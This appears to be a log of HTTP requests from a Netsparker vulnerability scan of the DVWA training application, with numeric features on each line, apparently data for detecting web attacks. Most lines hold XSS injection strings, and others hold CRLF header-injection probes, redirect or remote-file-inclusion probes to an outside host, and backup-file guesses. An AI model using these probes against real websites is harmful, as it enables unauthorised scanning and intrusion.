93,1,200,762,14,41,17,8,1,GET /DVWA/dvwa/images/?'\"@--></style></scRipt><scRipt>netsparker(0x000082)</scRipt> HTTP/1.1
93,1,200,762,14,41,17,8,1,GET /DVWA/dvwa/images/?'\"@--></style></scRipt><scRipt>netsparker(0x000083)</scRipt> HTTP/1.1
92,1,200,762,14,41,16,8,1,GET /DVWA/dvwa/images/?'\"--></style></scRipt><scRipt>netsparker(0x000081)</scRipt> HTTP/1.1
32,1,200,172,15,7,1,5,0,OPTIONS /DVWA/dvwa/css/ HTTP/1.1
33,1,405,517,16,7,1,5,0,PROPFIND /DVWA/dvwa/css/ HTTP/1.1
90,1,200,700,15,38,17,8,1,GET /DVWA/dvwa/css/?'\"@--></style></scRipt><scRipt>netsparker(0x0000A0)</scRipt> HTTP/1.1
90,1,200,700,15,38,17,8,1,GET /DVWA/dvwa/css/?'\"@--></style></scRipt><scRipt>netsparker(0x0000A1)</scRipt> HTTP/1.1
89,1,200,700,15,38,16,8,1,GET /DVWA/dvwa/css/?'\"--></style></scRipt><scRipt>netsparker(0x00009F)</scRipt> HTTP/1.1
63,1,404,483,12,30,5,5,1,GET /DVWA/dvwa/css/main.css%0Ans:netsparker056650=vuln HTTP/1.1
66,1,404,484,13,30,6,5,1,GET /DVWA/dvwa/css/main.css%0D%0Ans:netsparker056650=vuln HTTP/1.1
115,1,404,549,24,45,17,8,1,GET /DVWA/dvwa/css/main.css'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000A6)%3C/scRipt%3E HTTP/1.1
115,1,404,549,24,45,17,8,1,GET /DVWA/dvwa/css/main.css'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000A7)%3C/scRipt%3E HTTP/1.1
116,1,404,550,24,45,18,8,1,GET /DVWA/dvwa/css/main.css'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000B4)%3C/scRipt%3E HTTP/1.1
116,1,404,550,24,45,18,8,1,GET /DVWA/dvwa/css/main.css'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000B5)%3C/scRipt%3E HTTP/1.1
63,1,404,483,12,27,6,6,1,GET /DVWA/dvwa/css/main.css/%20ns=netsparker(0x0000B0) HTTP/1.1
63,1,404,483,12,27,6,6,1,GET /DVWA/dvwa/css/main.css/%20ns=netsparker(0x0000B1) HTTP/1.1
116,1,404,550,24,45,17,9,1,GET /DVWA/dvwa/css/main.css/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000A8)%3C/scRipt%3E HTTP/1.1
116,1,404,550,24,45,17,9,1,GET /DVWA/dvwa/css/main.css/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000A9)%3C/scRipt%3E HTTP/1.1
66,1,404,494,13,27,7,6,1,GET /DVWA/dvwa/css/main.css/%22ns=%22netsparker(0x0000AC) HTTP/1.1
66,1,404,494,13,27,7,6,1,GET /DVWA/dvwa/css/main.css/%22ns=%22netsparker(0x0000AD) HTTP/1.1
82,1,404,494,13,27,7,6,1,GET /DVWA/dvwa/css/main.css/%2522ns%253D%2522netsparker%25280x0000B2%2529 HTTP/1.1
82,1,404,494,13,27,7,6,1,GET /DVWA/dvwa/css/main.css/%2522ns%253D%2522netsparker%25280x0000B3%2529 HTTP/1.1
62,1,404,484,13,27,7,6,1,GET /DVWA/dvwa/css/main.css/'ns='netsparker(0x0000AE) HTTP/1.1
62,1,404,484,13,27,7,6,1,GET /DVWA/dvwa/css/main.css/'ns='netsparker(0x0000AF) HTTP/1.1
98,1,200,1374,16,45,18,8,1,GET /DVWA/dvwa/css/main.css?'\"@--></style></scRipt><scRipt>netsparker(0x0000BA)</scRipt> HTTP/1.1
98,1,200,1374,16,45,18,8,1,GET /DVWA/dvwa/css/main.css?'\"@--></style></scRipt><scRipt>netsparker(0x0000BB)</scRipt> HTTP/1.1
97,1,200,1374,15,45,17,8,1,GET /DVWA/dvwa/css/main.css?'\"--></style></scRipt><scRipt>netsparker(0x0000B6)</scRipt> HTTP/1.1
97,1,200,1374,15,45,17,8,1,GET /DVWA/dvwa/css/main.css?'\"--></style></scRipt><scRipt>netsparker(0x0000B7)</scRipt> HTTP/1.1
53,1,200,1374,11,22,6,8,0,GET /DVWA/dvwa/css/main.css?http://r87.com/? HTTP/1.1
53,1,200,1374,13,21,5,8,0,GET /DVWA/dvwa/css/main.css?hTTp://r87.com/n HTTP/1.1
75,1,200,1374,11,39,7,5,0,GET /DVWA/dvwa/css/main.css?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
78,1,200,1374,11,40,8,5,0,GET /DVWA/dvwa/css/main.css?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
124,1,200,1374,23,51,20,8,1,GET /DVWA/dvwa/css/main.css?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000097)%3C/scRipt%3E HTTP/1.1
52,1,200,1396,11,23,6,6,0,GET /DVWA/instructions.php?http://r87.com/? HTTP/1.1
77,1,200,1396,11,41,8,3,0,GET /DVWA/instructions.php?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
122,1,200,1396,25,52,19,6,1,GET /DVWA/instructions.php?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000AA)%3C/scRipt%3E HTTP/1.1
45,1,200,1561,11,16,6,6,0,GET /DVWA/setup.php?http://r87.com/? HTTP/1.1
70,1,200,1561,11,34,8,3,0,GET /DVWA/setup.php?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
115,1,200,1561,24,45,19,6,1,GET /DVWA/setup.php?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000B8)%3C/scRipt%3E HTTP/1.1
122,1,200,813,25,52,18,7,1,GET /DVWA/vulnerabilities/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000BC)%3C/scRipt%3E HTTP/1.1
122,1,200,813,25,52,18,7,1,GET /DVWA/vulnerabilities/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000BD)%3C/scRipt%3E HTTP/1.1
123,1,200,813,25,52,19,7,1,GET /DVWA/vulnerabilities/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000BE)%3C/scRipt%3E HTTP/1.1
123,1,200,813,25,52,19,7,1,GET /DVWA/vulnerabilities/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000BF)%3C/scRipt%3E HTTP/1.1
62,1,404,482,12,31,4,4,1,GET /DVWA/vulnerabilities/%0Ans:netsparker056650=vuln HTTP/1.1
65,1,404,483,13,31,5,4,1,GET /DVWA/vulnerabilities/%0D%0Ans:netsparker056650=vuln HTTP/1.1
61,1,404,481,13,28,5,4,1,GET /DVWA/vulnerabilities/%20ns=netsparker(0x0000CC) HTTP/1.1
61,1,404,481,13,28,5,4,1,GET /DVWA/vulnerabilities/%20ns=netsparker(0x0000CD) HTTP/1.1
114,1,404,548,24,46,16,7,1,GET /DVWA/vulnerabilities/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000C4)%3C/scRipt%3E HTTP/1.1
114,1,404,548,24,46,16,7,1,GET /DVWA/vulnerabilities/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000C5)%3C/scRipt%3E HTTP/1.1
114,1,404,548,24,46,16,7,1,GET /DVWA/vulnerabilities/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000C6)%3C/scRipt%3E HTTP/1.1
114,1,404,548,24,46,16,7,1,GET /DVWA/vulnerabilities/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000C7)%3C/scRipt%3E HTTP/1.1
115,1,404,549,24,46,17,7,1,GET /DVWA/vulnerabilities/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000D0)%3C/scRipt%3E HTTP/1.1
115,1,404,549,24,46,17,7,1,GET /DVWA/vulnerabilities/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000D1)%3C/scRipt%3E HTTP/1.1
64,1,404,492,12,28,6,4,1,GET /DVWA/vulnerabilities/%22ns=%22netsparker(0x0000C8) HTTP/1.1
64,1,404,492,12,28,6,4,1,GET /DVWA/vulnerabilities/%22ns=%22netsparker(0x0000C9) HTTP/1.1
80,1,404,492,14,28,6,4,1,GET /DVWA/vulnerabilities/%2522ns%253D%2522netsparker%25280x0000CE%2529 HTTP/1.1
80,1,404,492,14,28,6,4,1,GET /DVWA/vulnerabilities/%2522ns%253D%2522netsparker%25280x0000CF%2529 HTTP/1.1
97,1,200,813,15,46,17,7,1,GET /DVWA/vulnerabilities/?'\"@--></style></scRipt><scRipt>netsparker(0x0000D4)</scRipt> HTTP/1.1
97,1,200,813,15,46,17,7,1,GET /DVWA/vulnerabilities/?'\"@--></style></scRipt><scRipt>netsparker(0x0000D5)</scRipt> HTTP/1.1
96,1,200,813,15,46,16,7,1,GET /DVWA/vulnerabilities/?'\"--></style></scRipt><scRipt>netsparker(0x0000D2)</scRipt> HTTP/1.1
96,1,200,813,15,46,16,7,1,GET /DVWA/vulnerabilities/?'\"--></style></scRipt><scRipt>netsparker(0x0000D3)</scRipt> HTTP/1.1
52,1,200,813,11,23,5,7,0,GET /DVWA/vulnerabilities/?http://r87.com/? HTTP/1.1
52,1,200,813,13,22,4,7,0,GET /DVWA/vulnerabilities/?hTTp://r87.com/n HTTP/1.1
74,1,200,813,11,40,6,4,0,GET /DVWA/vulnerabilities/?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
77,1,200,813,11,41,7,4,0,GET /DVWA/vulnerabilities/?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
128,1,200,1709,24,57,18,8,1,GET /DVWA/vulnerabilities/brute/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000D6)%3C/scRipt%3E HTTP/1.1
60,1,404,482,13,28,6,4,1,GET /DVWA/vulnerabilities/'ns='netsparker(0x0000CA) HTTP/1.1
60,1,404,482,13,28,6,4,1,GET /DVWA/vulnerabilities/'ns='netsparker(0x0000CB) HTTP/1.1
39,1,200,172,15,15,1,4,0,OPTIONS /DVWA/vulnerabilities/ HTTP/1.1
40,1,405,524,16,15,1,4,0,PROPFIND /DVWA/vulnerabilities/ HTTP/1.1
67,1,200,1561,11,33,7,3,0,GET /DVWA/setup.php?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
115,1,200,1561,24,45,19,6,1,GET /DVWA/setup.php?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000B9)%3C/scRipt%3E HTTP/1.1
65,1,404,538,13,31,6,3,1,GET /DVWA/instructions.php%0D%0Ans:netsparker056650=vuln HTTP/1.1
74,1,200,1451,11,40,7,3,0,GET /DVWA/instructions.php?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
55,1,404,475,12,24,5,3,1,GET /DVWA/setup.php%0Ans:netsparker056650=vuln HTTP/1.1
58,1,404,476,13,24,6,3,1,GET /DVWA/setup.php%0D%0Ans:netsparker056650=vuln HTTP/1.1
45,1,200,1616,13,15,5,6,0,GET /DVWA/setup.php?hTTp://r87.com/n HTTP/1.1
128,1,200,1764,24,57,18,8,1,GET /DVWA/vulnerabilities/brute/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000D7)%3C/scRipt%3E HTTP/1.1
129,1,200,1764,24,57,19,8,1,GET /DVWA/vulnerabilities/brute/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000D8)%3C/scRipt%3E HTTP/1.1
129,1,200,1764,24,57,19,8,1,GET /DVWA/vulnerabilities/brute/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000D9)%3C/scRipt%3E HTTP/1.1
49,1,500,206,11,27,2,5,1,GET /DVWA/vulnerabilities/fi/include.php HTTP/1.1
62,1,404,537,12,31,5,3,1,GET /DVWA/instructions.php%0Ans:netsparker056650=vuln HTTP/1.1
52,1,200,1451,13,22,5,6,0,GET /DVWA/instructions.php?hTTp://r87.com/n HTTP/1.1
122,1,200,1451,25,52,19,6,1,GET /DVWA/instructions.php?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000AB)%3C/scRipt%3E HTTP/1.1
123,1,200,1451,24,52,20,6,1,GET /DVWA/instructions.php?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000E6)%3C/scRipt%3E HTTP/1.1
123,1,200,1451,24,52,20,6,1,GET /DVWA/instructions.php?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000E7)%3C/scRipt%3E HTTP/1.1
116,1,200,1616,24,45,20,6,1,GET /DVWA/setup.php?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000E2)%3C/scRipt%3E HTTP/1.1
116,1,200,1616,24,45,20,6,1,GET /DVWA/setup.php?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000E3)%3C/scRipt%3E HTTP/1.1
120,1,404,609,25,51,16,8,1,GET /DVWA/vulnerabilities/brute/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000DE)%3C/scRipt%3E HTTP/1.1
120,1,404,609,25,51,16,8,1,GET /DVWA/vulnerabilities/brute/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000DF)%3C/scRipt%3E HTTP/1.1
120,1,404,609,24,51,16,8,1,GET /DVWA/vulnerabilities/brute/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000E0)%3C/scRipt%3E HTTP/1.1
120,1,404,609,24,51,16,8,1,GET /DVWA/vulnerabilities/brute/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000E1)%3C/scRipt%3E HTTP/1.1
58,1,200,1764,11,28,5,8,0,GET /DVWA/vulnerabilities/brute/?http://r87.com/? HTTP/1.1
58,1,200,1764,13,27,4,8,0,GET /DVWA/vulnerabilities/brute/?hTTp://r87.com/n HTTP/1.1
80,1,200,1764,11,45,6,5,0,GET /DVWA/vulnerabilities/brute/?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
83,1,200,1764,11,46,7,5,0,GET /DVWA/vulnerabilities/brute/?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
54,1,404,531,11,32,2,5,1,GET /DVWA/vulnerabilities/captcha/include.php HTTP/1.1
72,2,200,1871,11,46,6,4,0,GET /DVWA/vulnerabilities/view_help.php?id=captcha&security=low HTTP/1.1
67,2,200,1150,11,41,6,4,0,GET /DVWA/vulnerabilities/view_help.php?id=fi&security=low HTTP/1.1
69,2,200,1084,11,43,6,4,0,GET /DVWA/vulnerabilities/view_source.php?id=fi&security=low HTTP/1.1
114,1,404,603,25,46,17,6,1,GET /DVWA/instructions.php'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000EC)%3C/scRipt%3E HTTP/1.1
114,1,404,603,25,46,17,6,1,GET /DVWA/instructions.php'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000ED)%3C/scRipt%3E HTTP/1.1
115,1,404,604,25,46,18,6,1,GET /DVWA/instructions.php'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000FC)%3C/scRipt%3E HTTP/1.1
115,1,404,604,25,46,18,6,1,GET /DVWA/instructions.php'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000FD)%3C/scRipt%3E HTTP/1.1
62,1,200,1451,12,28,6,4,0,GET /DVWA/instructions.php/%20ns=netsparker(0x0000F5) HTTP/1.1
62,1,200,1451,12,28,6,4,0,GET /DVWA/instructions.php/%20ns=netsparker(0x0000F6) HTTP/1.1
115,1,200,1451,25,46,17,7,1,GET /DVWA/instructions.php/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000EE)%3C/scRipt%3E HTTP/1.1
115,1,200,1451,25,46,17,7,1,GET /DVWA/instructions.php/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0000EF)%3C/scRipt%3E HTTP/1.1
65,1,200,1451,12,28,7,4,1,GET /DVWA/instructions.php/%22ns=%22netsparker(0x0000F0) HTTP/1.1
65,1,200,1451,12,28,7,4,1,GET /DVWA/instructions.php/%22ns=%22netsparker(0x0000F1) HTTP/1.1
81,1,200,1451,13,28,7,4,0,GET /DVWA/instructions.php/%2522ns%253D%2522netsparker%25280x0000F8%2529 HTTP/1.1
81,1,200,1451,13,28,7,4,0,GET /DVWA/instructions.php/%2522ns%253D%2522netsparker%25280x0000F9%2529 HTTP/1.1
61,1,200,1451,12,28,7,4,1,GET /DVWA/instructions.php/'ns='netsparker(0x0000F2) HTTP/1.1
61,1,200,1451,12,28,7,4,1,GET /DVWA/instructions.php/'ns='netsparker(0x0000F3) HTTP/1.1
97,1,200,1451,14,46,18,6,1,GET /DVWA/instructions.php?'\"@--></style></scRipt><scRipt>netsparker(0x000102)</scRipt> HTTP/1.1
97,1,200,1451,14,46,18,6,1,GET /DVWA/instructions.php?'\"@--></style></scRipt><scRipt>netsparker(0x000103)</scRipt> HTTP/1.1
96,1,200,1451,14,46,17,6,1,GET /DVWA/instructions.php?'\"--></style></scRipt><scRipt>netsparker(0x000100)</scRipt> HTTP/1.1
96,1,200,1451,14,46,17,6,1,GET /DVWA/instructions.php?'\"--></style></scRipt><scRipt>netsparker(0x000101)</scRipt> HTTP/1.1
107,1,404,596,23,39,17,6,1,GET /DVWA/setup.php'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000108)%3C/scRipt%3E HTTP/1.1
107,1,404,596,23,39,17,6,1,GET /DVWA/setup.php'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000109)%3C/scRipt%3E HTTP/1.1
108,1,200,1616,24,39,17,7,1,GET /DVWA/setup.php/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00010A)%3C/scRipt%3E HTTP/1.1
108,1,200,1616,24,39,17,7,1,GET /DVWA/setup.php/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00010B)%3C/scRipt%3E HTTP/1.1
58,1,200,1616,12,21,7,4,1,GET /DVWA/setup.php/%22ns=%22netsparker(0x00010C) HTTP/1.1
58,1,200,1616,12,21,7,4,1,GET /DVWA/setup.php/%22ns=%22netsparker(0x00010D) HTTP/1.1
54,1,200,1616,12,21,7,4,1,GET /DVWA/setup.php/'ns='netsparker(0x00010E) HTTP/1.1
54,1,200,1616,12,21,7,4,1,GET /DVWA/setup.php/'ns='netsparker(0x00010F) HTTP/1.1
68,1,404,543,12,36,4,5,1,GET /DVWA/vulnerabilities/brute/%0Ans:netsparker056650=vuln HTTP/1.1
71,1,404,544,13,36,5,5,1,GET /DVWA/vulnerabilities/brute/%0D%0Ans:netsparker056650=vuln HTTP/1.1
67,1,404,542,13,33,5,5,1,GET /DVWA/vulnerabilities/brute/%20ns=netsparker(0x0000FE) HTTP/1.1
67,1,404,542,13,33,5,5,1,GET /DVWA/vulnerabilities/brute/%20ns=netsparker(0x0000FF) HTTP/1.1
121,1,404,610,23,51,17,8,1,GET /DVWA/vulnerabilities/brute/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000110)%3C/scRipt%3E HTTP/1.1
121,1,404,610,23,51,17,8,1,GET /DVWA/vulnerabilities/brute/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000111)%3C/scRipt%3E HTTP/1.1
70,1,404,553,12,33,6,5,1,GET /DVWA/vulnerabilities/brute/%22ns=%22netsparker(0x0000F4) HTTP/1.1
70,1,404,553,12,33,6,5,1,GET /DVWA/vulnerabilities/brute/%22ns=%22netsparker(0x0000F7) HTTP/1.1
86,1,404,553,12,33,6,5,1,GET /DVWA/vulnerabilities/brute/%2522ns%253D%2522netsparker%25280x000104%2529 HTTP/1.1
86,1,404,553,12,33,6,5,1,GET /DVWA/vulnerabilities/brute/%2522ns%253D%2522netsparker%25280x000105%2529 HTTP/1.1
102,1,200,1764,14,51,16,8,1,GET /DVWA/vulnerabilities/brute/?'\"--></style></scRipt><scRipt>netsparker(0x000112)</scRipt> HTTP/1.1
66,1,404,543,13,33,6,5,1,GET /DVWA/vulnerabilities/brute/'ns='netsparker(0x0000FA) HTTP/1.1
66,1,404,543,13,33,6,5,1,GET /DVWA/vulnerabilities/brute/'ns='netsparker(0x0000FB) HTTP/1.1
127,1,200,1709,23,56,18,8,1,GET /DVWA/vulnerabilities/exec/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000114)%3C/scRipt%3E HTTP/1.1
47,1,200,1433,11,25,2,5,0,GET /DVWA/vulnerabilities/fi/index.php HTTP/1.1
84,1,404,561,12,40,2,5,1,GET /DVWA/vulnerabilities/fi/Netsparker5aa6dfe0c40249e0913149ea8f558f96.php HTTP/1.1
64,2,200,1739,13,36,5,5,1,GET /DVWA/vulnerabilities/sqli_blind/?id=&Submit=Submit HTTP/1.1
65,2,200,1768,13,36,5,5,1,GET /DVWA/vulnerabilities/sqli_blind/?id=3&Submit=Submit HTTP/1.1
57,1,404,534,11,34,2,5,1,GET /DVWA/vulnerabilities/sqli_blind/include.php HTTP/1.1
75,2,200,1368,11,48,6,4,1,GET /DVWA/vulnerabilities/view_help.php?id=sqli_blind&security=low HTTP/1.1
74,2,200,2063,11,48,6,4,0,GET /DVWA/vulnerabilities/view_source.php?id=captcha&security=low HTTP/1.1
77,2,200,1513,11,50,6,4,1,GET /DVWA/vulnerabilities/view_source.php?id=sqli_blind&security=low HTTP/1.1
62,1,404,194,13,32,4,5,1,HEAD /DVWA/vulnerabilities/fi/Copy%20of%20include.php HTTP/1.1
50,1,404,194,12,27,2,5,1,HEAD /DVWA/vulnerabilities/fi/include.old HTTP/1.1
50,1,500,187,12,27,2,5,1,HEAD /DVWA/vulnerabilities/fi/include.php HTTP/1.1
54,1,404,194,12,30,3,5,1,HEAD /DVWA/vulnerabilities/fi/include.php.bak HTTP/1.1
54,1,404,194,12,30,3,5,1,HEAD /DVWA/vulnerabilities/fi/include.php.nsx HTTP/1.1
54,1,404,194,12,30,2,5,1,HEAD /DVWA/vulnerabilities/fi/include.php_old HTTP/1.1
51,1,404,194,12,27,2,5,1,HEAD /DVWA/vulnerabilities/fi/include.php~ HTTP/1.1
45,1,200,1764,15,20,1,5,0,OPTIONS /DVWA/vulnerabilities/brute/ HTTP/1.1
44,1,200,541,12,22,1,5,0,POST /DVWA/vulnerabilities/captcha/ HTTP/1.1
46,1,200,1764,16,20,1,5,0,PROPFIND /DVWA/vulnerabilities/brute/ HTTP/1.1
127,1,200,1764,23,56,18,8,1,GET /DVWA/vulnerabilities/csrf/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000116)%3C/scRipt%3E HTTP/1.1
57,1,200,1709,11,27,5,8,0,GET /DVWA/vulnerabilities/exec/?http://r87.com/? HTTP/1.1
82,1,200,1709,11,45,7,5,0,GET /DVWA/vulnerabilities/exec/?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
44,1,200,1709,15,19,1,5,0,OPTIONS /DVWA/vulnerabilities/exec/ HTTP/1.1
103,1,200,1764,14,51,17,8,1,GET /DVWA/vulnerabilities/brute/?'\"@--></style></scRipt><scRipt>netsparker(0x000118)</scRipt> HTTP/1.1
102,1,200,1764,14,51,16,8,1,GET /DVWA/vulnerabilities/brute/?'\"--></style></scRipt><scRipt>netsparker(0x000113)</scRipt> HTTP/1.1
127,1,200,1763,23,56,18,8,1,GET /DVWA/vulnerabilities/csrf/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000117)%3C/scRipt%3E HTTP/1.1
66,1,404,541,11,32,5,5,1,GET /DVWA/vulnerabilities/csrf/%20ns=netsparker(0x000128) HTTP/1.1
66,1,404,541,11,32,5,5,1,GET /DVWA/vulnerabilities/csrf/%20ns=netsparker(0x000129) HTTP/1.1
119,1,404,608,23,50,16,8,1,GET /DVWA/vulnerabilities/csrf/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000120)%3C/scRipt%3E HTTP/1.1
119,1,404,608,23,50,16,8,1,GET /DVWA/vulnerabilities/csrf/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000121)%3C/scRipt%3E HTTP/1.1
119,1,404,608,23,50,16,8,1,GET /DVWA/vulnerabilities/csrf/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000122)%3C/scRipt%3E HTTP/1.1
119,1,404,608,23,50,16,8,1,GET /DVWA/vulnerabilities/csrf/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000123)%3C/scRipt%3E HTTP/1.1
120,1,404,609,24,50,17,8,1,GET /DVWA/vulnerabilities/csrf/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00012C)%3C/scRipt%3E HTTP/1.1
120,1,404,609,24,50,17,8,1,GET /DVWA/vulnerabilities/csrf/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00012D)%3C/scRipt%3E HTTP/1.1
69,1,404,552,11,32,6,5,1,GET /DVWA/vulnerabilities/csrf/%22ns=%22netsparker(0x000124) HTTP/1.1
69,1,404,552,11,32,6,5,1,GET /DVWA/vulnerabilities/csrf/%22ns=%22netsparker(0x000125) HTTP/1.1
85,1,404,552,13,32,6,5,1,GET /DVWA/vulnerabilities/csrf/%2522ns%253D%2522netsparker%25280x00012A%2529 HTTP/1.1
85,1,404,552,13,32,6,5,1,GET /DVWA/vulnerabilities/csrf/%2522ns%253D%2522netsparker%25280x00012B%2529 HTTP/1.1
101,1,200,1763,15,50,16,8,1,GET /DVWA/vulnerabilities/csrf/?'\"--></style></scRipt><scRipt>netsparker(0x00012E)</scRipt> HTTP/1.1
101,1,200,1763,15,50,16,8,1,GET /DVWA/vulnerabilities/csrf/?'\"--></style></scRipt><scRipt>netsparker(0x00012F)</scRipt> HTTP/1.1
57,1,200,1763,13,26,4,8,0,GET /DVWA/vulnerabilities/csrf/?hTTp://r87.com/n HTTP/1.1
128,1,200,1763,24,56,19,8,1,GET /DVWA/vulnerabilities/csrf/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00011A)%3C/scRipt%3E HTTP/1.1
128,1,200,1763,24,56,19,8,1,GET /DVWA/vulnerabilities/csrf/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00011B)%3C/scRipt%3E HTTP/1.1
